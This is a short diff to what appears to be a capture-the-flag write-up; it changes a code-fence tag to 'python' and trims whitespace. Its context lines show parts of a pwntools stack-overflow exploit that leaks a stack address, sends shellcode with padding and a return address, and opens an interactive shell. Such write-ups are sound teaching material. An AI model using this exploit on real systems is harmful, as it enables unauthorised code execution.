@@ -58,7 +58,7 @@ It means that if we place a shellcode in the stack and redirect the program to t
 
 Now we have everything to write the exploit, and this time I used PwnTools to help me in the communication with the remote server:
 
-```code
+```python
 from pwn import *
 
 '''
@@ -91,7 +91,7 @@ a = p.recv(80)
 addr = int(a[60:74], 16)
 payload = shellcode + (72 - len(shellcode))*'a' + p64(addr)
 p.sendline(payload)
-p.interactive() 
+p.interactive()
 #print payload
 
 ```
